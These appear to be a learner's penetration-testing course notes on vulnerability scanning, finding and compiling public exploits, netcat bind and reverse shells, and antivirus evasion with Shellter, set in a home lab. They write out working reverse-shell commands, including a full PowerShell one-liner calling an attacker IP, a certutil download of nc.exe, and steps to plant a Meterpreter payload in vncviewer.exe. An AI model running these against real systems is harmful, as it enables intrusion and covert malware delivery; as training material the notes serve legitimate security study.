## Vulnerability Scanning

### Banner Grabbing

Banner Grabbing: is an information gathering technique used to enumerate information regarding the target operating system and services that're running on its open ports.

It can be performed through various techniques:

* Performing a service vs detection scan with Nmap
* Connecting to the open port with Netcat
* Authenticating with the service (if it supports authentication), like as SSH, FTP, Telnet, etc..

#### Nmap

We can use -sV and -O flags to check service and OS version:

<pre class="language-bash"><code class="lang-bash"><strong>nmap -SV -0 IP
</strong></code></pre>

in alternative using nmap script or script engine:

```bash
ls -al /usr/share/nmap/scruots/ | grep banner
nmap -SV -script-banner IP
```

#### Netcat

Netcat is a TCP/IP swiss army knife, we can explore its functionality by:

```bash
man nc
```

to do banner grabbing we need to specify port to scan, it usually is more accurate than nmap.

```bash
nc IP port
```

After that, we can use tools like as searchsploit to find exploit/vulnerabilities associeted at their service vs.

#### Authentication

Retrieve banner using authentication, it usually isn't very helpful because not show always service version. We can use this technic for service such as: ssh, telnet, etc.

Trying SSH authentication:

```
ssh user@IP
```

shell show banner message after this command, and next it ask us password (we can't need to say it, but it's not a problem).

### Vulnerability scanning with NMAP Script

We can find a list of NSE on www.nmap.org/books/nse.html or locally:

```bash
ls -al /usr/share/nmap/scripts/ | grep vuln #to find vulnerabilities
```

If one sites has shellshock vulnerability, we can check it using this script:

<pre class="language-bash"><code class="lang-bash">ls -al /usr/share/nmap/scripts/ | grep shellshock
<strong>nmap -sV -p 80 --script=http-shellshock IP
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

countdown time showed in this photo maybe means that website use a dynamic counter, probably on the server side, viewing source we see that in the js script code there's a script called gettime.cgi.

**CGI** scripts are used to execute system commands, commands on the actual server or on the OS that is running or hosting web server and the website and display output on the website.

**Shellshock** vulnerability affects them, if we try to search IP/gettime.cgi one browser, we see only dynamic counter, to check if is it vulnerable we can use: http-shellshock script with URL how argument.

```bash
nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" IP
```

## Searching for Exploits

After identification potential vulnerabilities of target, we need to search how to exploit it. Exploit code can easily found online, however, downloading and running them against a target can be quite dangerous, than, it's therefore recommended to analyze the exploit code and check if it works as intended.

**Verifiable online sources**:

* [exploit-db.com](https://www.exploit-db.com/)
  * always check for the **Verified** column
  * use search filters
  * [Dorks - Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
* [Rapid7 db](https://www.rapid7.com/db/)

We can use google dorks to find vulnerabilities quickly:

```bash
vsftpd 2.3.4 site:exploit-db.com #the same for rapid7 and github
```

Another good resource to know is [packet storm](https://packetstormsecurity.com/) that provides the latest info about vulnerabilities. It's a good attitude check on them and active RSS feed.

In additional, packet storm website contains a good section with all security tools.

> ‚ùó **Always pay attention at publicly available exploits. An exploit can be weaponized to attack the actual attacker system!**
>
> üìå Analyze the exploit code behavior to ensure that it works as intended.

### [Searchsploit](https://www.exploit-db.com/searchsploit)

üóíÔ∏è [**searchsploit**](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/searchsploit) - command line search tool for Exploit-Db that allows to have an offline copy of the Exploit-Db.

* Useful for security assessments on networks without Internet access
* Pre-packed with Kali Linux
* `exploitdb` local directory is:
  * `/usr/share/exploitdb`

```bash
# Debian-based distro install
sudo apt update && sudo apt -y install exploitdb
```

```bash
ls -al /usr/share/exploitdb

# Update the exploitdb package updates
searchsploit -u
```

```bash
searchsploit [options] <term>
searchsploit vsftpd 2.3.4

# Copy an exploit to the current working dir
searchsploit -m 49757    

# Case sensitive search
searchsploit -c OpenSSH

# Search just the exploit title
searchsploit -t vsftpd

# Exact search on title
searchsploit -e "Windows 7"

# Filters search
searchsploit remote windows smb
searchsploit remote linux ssh
searchsploit remote linux ssh OpenSSH
searchsploit remote webapps wordpress
searchsploit local windows
searchsploit local windows | grep -e "Microsoft"

# List online links
searchsploit -w remote windows smb | grep -e "EternalBlue"
```

## Fixing Exploits

> üî¨ Check the [Fixing Exploits Lab here](broken-reference)

### Cross-Compiling Exploits

Exploit code developed in `C`, `C++`, `C#` has to be compiled into a portable executable or binary.

üóíÔ∏è **Cross-compilation** is the process of building on one platform a binary that will run on another platform.

* Compiling `C` code is a necessary skill

> üìå [ExploitDB bin-sploits](https://github.com/offensive-security/exploitdb-bin-sploits) - **useful for pre-compiled binaries**

e.g. of Windows and Linux exploit code compiling

* [VideoLAN VLC Media Player 0.8.6f - 'smb://' URI Handling Remote Buffer Overflow](https://www.exploit-db.com/exploits/9303)
* [Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE\_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839)

Tools:

* [**MinGW-w64**](https://www.mingw-w64.org/)

```bash
sudo apt -y install mingw-w64 gcc
```

#### Windows

* Download the VLC exploit or use `searchsploit`

```bash
searchsploit VideolAN VLC SMB
searchsploit -m 9303
```

* Compile the `C` exploit
  * check for comments in the code regarding the compilation commands

```bash
# Compile for x64
x86_64-w64-mingw32-gcc 9303.c -o exploit64.exe

# Compile for x86 (32-bit)
i686-w64-mingw32-gcc 9303.c -o exploit32.exe
```

#### Linux

* Download the DirtyCow exploit or use `searchsploit`

```bash
searchsploit Dirty Cow
searchsploit -m 40839
```

* Compile the `C` exploit
  * check for comments in the code regarding the compilation commands to compile it successfully

```bash
# Compile with
gcc -pthread 40839.c -o dirty_exploit -lcrypt
```

## Bind & Reverse [Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)

### [Netcat](broken-reference)

**`nc`** - a network utility used for a variety of tasks associated with TCP/UDP.

* **Client mode** - used for connection to any TCP/UDP port or to a listener
* **Server Mode** - used as a listener for connection from clients on a specific port

Functionalities:

* open TCP connections, listen on TCP or UDP ports
* Banner grabbing, Port scanning, Files transferring
* Bind/Reverse shells
* üìå [Hacking with Netcat](https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/)

```bash
# Debian based distro - install
sudo apt update && sudo apt install -y netcat
```

> üî¨ Some HFS Lab commands

```bash
nc <TARGET_IP> <TARGET_PORT>
nc -nv 10.2.23.227 80 #best and simple combination
# -n = no DNS resolution
# -v = verbose

nc -nvu 10.2.23.227 445
# -u = UDP port
```

**Setup a listener**:

* Transfer `nc.exe` to the windows target

```bash
# Attacker machine
ip -br -c a
	10.10.24.4/24
cd /usr/share/windows-binaries/
python -m SimpleHTTPServer 80


# Target machine
cd Desktop
certutil -urlcache -f http://10.10.24.4/nc.exe nc.exe
```

* Setup a listener on the attacker machine

```bash
# Attacker machine
nc -nvlp 1234
nc -nvlup 1234 # listen on a UDP port


# Target machine
nc.exe -nv 10.10.24.4 1234
nc.exe -nvu 10.10.24.4 1234

# A connection is received on the Attacker machine
```

* Transfer files with `nc`

```bash
# A listener must be present on the target system
# Target machine
nc.exe -nvlp 1234 > test.txt

# Attacker machine
echo "Hello target" > test.txt
nc -nv 10.2.23.227 1234 < test.txt
```

### Bind Shells

> üìå [Bind and Reverse shells](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)

üóíÔ∏è **Bind Shell** - a remote shell where _the attacker connects to the listener running on the target system_ and execute commands on the target system.

* _Bind shells issues_:
  * Must have access to the target system
  * Inbound traffic can be blocked by a firewall, it is very suspect
* A `netcat` listener must be configured on the target system to execute:
* `cmd.exe` - Windows
* `/bin/bash` - Linux

> üî¨ Same lab as above (IPs might change)

* Once uploaded the `nc.exe` on the target system, proceed with the bind shell

```bash
# Target Win machine - Bind shell listener with executable cmd.exe
nc.exe -nvlp 1234 -e cmd.exe

# Attacker Linux machine
nc -nv 10.2.22.140 1234
```

```bash
# Target Linux machine - Bind shell listener with /bin/bash
nc -nvlp 1234 -c /bin/bash

# Attacker Win machine
nc.exe -nv 10.10.24.2 1234
```

### Reverse Shells

üóíÔ∏è **Reverse Shell** - a remote shell where _the target connects to a listener running on the attacker's system_ (**`e.g.`** Metasploit Meterpreter).

* _Reverse shells advantages_:
  * The connection can be initialized without `netcat` too
  * Outgoing traffic may not be blocked by firewalls
* _Reverse shells issues_:
  * used exploit have to know the attacker's IP
  * the attacker's IP can be logged as malicious or present in the exploit file

```bash
# Attacker Linux machine
nc -nvlp 1234

# Target Win machine
nc.exe -nv 10.10.18.3 1234 -e cmd.exe
```

```bash
# Attacker Linux machine
nc -nvlp 1234

# Target Linux machine (localhost in this case)
nc -nv 127.0.0.1 1234 -e /bin/bash
```

#### Reverse Shell without Netcat

üìå [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

* Examples of Reverse Shell with different code (bash, Python, Powershell, PHP, etc)

üìå [Reverse Shell Generator](https://www.revshells.com/)

e.g.

```bash
# Kali Linux attacker machine
nc -nvlp 9001
```

```bash
# Windows target machine
# Run CMD and paste the code below
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.31.128',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Exploitation Frameworks

### The Metasploit Framework

* Focus on the **Exploitation** phase
* Modular
* MSF turns the exploit code into a module, using the `Ruby` programming language

> üî¨ Check the [Workflow Platform Lab here](broken-reference)

### [PowerShell-Empire](https://github.com/BC-SECURITY/Empire)

**`Empire`** - PowerShell post-exploitation framework for Win, Linux and macOS

> _Empire is a post-exploitation and adversary emulation framework that is used to aid Red Teams and Penetration Testers. The Empire server is written in Python 3 and is modular to allow operator flexibility. Empire comes built-in with a client that can be used remotely to access the server. There is also a GUI available for remotely accessing the Empire server,_ [_Starkiller_](https://github.com/BC-SECURITY/Starkiller)_._

* PowerShell-Empire is primarily designed for Windows targets
* **`Starkiller`** - GUI frontend for `PowerShell-Empire`
* [Kali Linux install](https://www.kali.org/tools/powershell-empire/)

```bash
sudo apt update && sudo apt install -y powershell-empire
```

> üî¨ Home Lab based on a Kali Linux attacker VM and Win7 target VM with IP `192.168.31.131`

```

## Windows Black Box Exploitation

üóíÔ∏è **Black Box** penetration test - security assessment conducted without any internal system or network knowledge.

* The pentester act like an _external unprivileged hacker from outside the network_
* No information about the target system

Typical **Black Box Methodology**:

* Host discovery ‚û°Ô∏è Port Scanning ‚û°Ô∏è Enumeration
* Vulnerability detection
* Exploitation ‚û°Ô∏è Manual/Automated
* Post Exploitation - PrivEsc ‚û°Ô∏è Persistence ‚û°Ô∏è Dumping Hashes

e.g.

**Scenario**

* Penetration Test to gain access and exploit a Win Server 2008 host.

**Scope**

* Identify running and vulnerable services on the target
* Exploit the vulnerabilities to obtain a foothold

> üî¨ The techniques will be covered in the dedicated [Win Black Box Pentest Lab here](broken-reference). This is a lab containing a [Metasploitable3](https://github.com/rapid7/metasploitable3) target.
>
> * Identify easily exploitable services
> * Pick the target as efficiently as possible
> * Time is a factor

## Linux Black Box Exploitation

**Scenario**

* Penetration Test to gain access and exploit a Linux server host.

**Scope**

* Identify running and vulnerable services on the target
* Exploit the vulnerabilities to obtain a foothold and gain access to the system

> üî¨ The techniques will be covered in the dedicated [Linux Black Box Pentest Lab here](broken-reference). This is a lab containing a [Metasploitable2](https://docs.rapid7.com/metasploit/metasploitable-2/) target.

## AV Evasion & Obfuscation

üóíÔ∏è [**Defense Evasion**](https://attack.mitre.org/tactics/TA0005/) _consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or **obfuscating/encrypting** data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware._ (MITRE)

* **Antivirus detection methods** can be classified as follows:

|             Method            | Description                                                                                                                                                     |
| :---------------------------: | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Signature based detection** | A signature is a static unique sequence of bytes of known malware, created using essential elements of an analyzed file. The AV comes with a signature database |
|  **Heuristic base detection** | Statically examine files for suspicious specific characteristics, relying on rules to determine a malicious binary                                              |
|  **Behavior based detection** | Monitor malware for suspicious behavior                                                                                                                         |

* **On-disk Evasion** techniques
  * **Obfuscation** - _The act of hiding anything crucial, useful, or vital. Code is reorganized through obfuscation to make it more difficult to decipher or reverse engineer._
  * **Encoding** - _The process of transforming data into a new format using an encoding strategy. Data can be encoded to a new format and then decoded back to its original format since **encoding is a reversible operation**._
  * **Packing** - _Generate executables with updated binary structures, lower in size and a new payload's signature._
  * **Crypters** - _Encrypts payloads, then the encrypted code is decrypted in memory. The decryption key is typically kept in a stub._ (ransomware)
* **In-memory Evasion** techniques
  * _Memory manipulation_ rather than writing files to disk
  * Payload is injected into a process, then executed in memory in a separate thread

### [Shellter](https://www.shellterproject.com/introducing-shellter/)

**`Shellter`** - _dynamic shellcode injection tool and dynamic PE (Portable Executable) infector ever created._

* Uses a unique dynamic approach based on the execution flow of the target app
* Takes advantage of the original structure of the PE file
* Supports any 32-bit payload (generated either by metasploit or custom ones by the user)
* Portable
* Compatible with Windows x86/x64 (XP SP3 and above) & Wine/CrossOver for Linux/Mac

> üî¨ Home lab with Kali Linux and Win7 VMs

[Shellter Kali Linux Installation](https://www.kali.org/tools/shellter/):

```bash
sudo apt update && sudo apt install -y shellter

# Wine64 will be automatically installed
# Win32 needs additional commands to install it
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32
rm -r ~/.wine
```

```bash
cd /usr/share/windows-resources/shellter
```

* Execute an `exe` file on Linux

```bash
sudo shellter
```

* Inject the shellcode into`/usr/share/windows-binaries/vncviewer.exe` file after copying it to a folder

```bash
mkdir AVBypass
cd AVBypass
cp /usr/share/windows-binaries/vncviewer.exe .
```

* In the `SHELLTER` windows, choose `A` for automatic
* PE Target: `/home/kali/certs/ejpt/AVBypass/vncviewer.exe`
* Stealth Mode: `Y` = `vncviewer` will function as normal and the shellcode will be executed in the background
* Payload: `L` - `1`
* LHOST: Attacker's IP - `192.168.31.128`
* LPORT: `1234`
* Now the `/home/kali/certs/ejpt/AVBypass/vncviewer.exe` **file has been replaced by the Shellter generated malicious executable**
* Copy the `vncviewer.exe` file to the target machine

```bash
# Attacker VM
cd /home/kali/certs/ejpt/AVBypass/
sudo python -m http.server 80

# In another terminal
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.31.128
set LPORT 1234
run
```

* Run the `vncviewer.exe` file and chheck the `msfconsole` Meterpreter session
